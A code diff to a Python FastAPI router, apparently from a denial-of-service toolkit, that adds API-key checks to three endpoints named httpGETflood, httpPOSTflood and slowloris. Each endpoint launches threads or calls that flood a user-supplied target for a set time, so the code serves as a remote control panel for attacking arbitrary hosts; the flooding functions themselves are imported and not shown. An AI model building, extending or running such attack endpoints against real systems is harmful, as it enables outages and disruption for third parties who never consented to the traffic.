@@ -1,6 +1,7 @@
 """Layer 7 Router."""
 
-from fastapi import APIRouter, Request, Response
+from fastapi import APIRouter, Depends, Request, Response
+from src.auth import verify_api_key
 from src.denialofservice.layer7 import Layer7
 from src.globals import NUMBER_OF_THREADS
 from threading import Thread
@@ -11,7 +12,7 @@ layer7_router = APIRouter()
 
 
 @layer7_router.post("/httpGETflood")
-async def http_get_flood(get_flood: HttpGetFloodRequest, request: Request):
+async def http_get_flood(get_flood: HttpGetFloodRequest, request: Request, api_key_dependency: bool = Depends(verify_api_key)):
     try:
         for i in range(NUMBER_OF_THREADS):
             t = Thread(target=Layer7.http_get_flood, args=(get_flood.target, get_flood.time,))
@@ -26,7 +27,7 @@ async def http_get_flood(get_flood: HttpGetFloodRequest, request: Request):
 
 
 @layer7_router.post("/httpPOSTflood")
-async def http_post_flood(post_flood: HttpPostFloodRequest, request: Request):
+async def http_post_flood(post_flood: HttpPostFloodRequest, request: Request, api_key_dependency: bool = Depends(verify_api_key)):
     try:
         for i in range(NUMBER_OF_THREADS):
             t = Thread(target=Layer7.http_post_flood,
@@ -42,7 +43,7 @@ async def http_post_flood(post_flood: HttpPostFloodRequest, request: Request):
 
 
 @layer7_router.post("/slowloris")
-async def slow_loris(slow_loris: SlowlorisFloodRequest, request: Request):
+async def slow_loris(slow_loris: SlowlorisFloodRequest, request: Request, api_key_dependency: bool = Depends(verify_api_key)):
     try:
         Layer7.slow_loris(slow_loris.target, slow_loris.port, slow_loris.time)
         log.info(
